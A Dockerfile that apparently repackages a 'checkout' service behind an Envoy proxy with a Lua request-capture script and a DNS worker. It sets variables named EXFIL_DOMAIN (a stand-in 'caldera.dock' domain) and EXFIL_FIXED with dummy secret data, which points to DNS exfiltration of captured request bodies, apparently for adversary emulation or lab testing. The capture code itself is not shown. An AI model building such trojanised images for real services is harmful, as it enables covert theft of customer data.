FROM registry:5000/checkout:2.0.2 AS app_orig

# === Stage 2: runtime with Envoy ===
FROM envoyproxy/envoy:v1.31-latest

ARG EXFIL_DOMAIN="caldera.dock"

# Install minimal tools + Python + dig
RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates jq bash coreutils gettext-base \
    python3 python3-distutils dnsutils \
 && rm -rf /var/lib/apt/lists/*

# Working directories
RUN mkdir -p /usr/src/app /etc/envoy /etc/envoy/lua /logs \
 && chmod 0777 /logs

# Copy binary app
COPY --from=app_orig /usr/src/app/checkout /usr/src/app/checkout

# Copy Envoy template, Lua script, DNS worker, and entrypoint
COPY envoy.yaml.tpl /etc/envoy/envoy.yaml.tpl
COPY lua/capture.lua /etc/envoy/lua/capture.lua
COPY dns_worker.py /usr/src/app/dns_worker.py
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh /usr/src/app/dns_worker.py

# Default environment variables
ENV LISTEN_PORT=8080 \
    APP_PORT=18080 \
    MAX_BODY_BYTES=4096 \
    EXFIL_DOMAIN="$EXFIL_DOMAIN" \
    EXFIL_FIXED="123-SECRET-DATA-1234" \
    DNS_WORKER_BIND=127.0.0.1 \
    DNS_WORKER_PORT=55354

RUN rm -f /etc/envoy/envoy.yaml

EXPOSE 8080
CMD ["/entrypoint.sh"]
